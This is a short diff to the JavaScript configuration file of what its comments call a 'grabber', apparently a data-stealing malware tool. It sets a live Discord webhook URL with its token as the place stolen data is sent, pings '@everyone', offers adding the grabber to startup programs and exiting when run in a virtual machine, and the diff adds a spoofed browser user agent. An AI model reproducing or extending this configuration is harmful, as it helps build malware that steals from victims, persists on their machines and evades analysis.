@@ -7,6 +7,7 @@ module.exports = {
     url: 'https://discord.com/api/webhooks/1008130525665439816/wRlNXfACrEsTok15kBDKundj_6G6u1-ksvFOgQeqv_ZtS25wZfxkFJUn0k34pQnP7KFE',
     content: '@everyone',
   },
+  userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
   // Should we add the grabber to the startup programs?
   addToStartup: false,
   // If the user runs the grabber from a virtual machine, should the grabber exits?
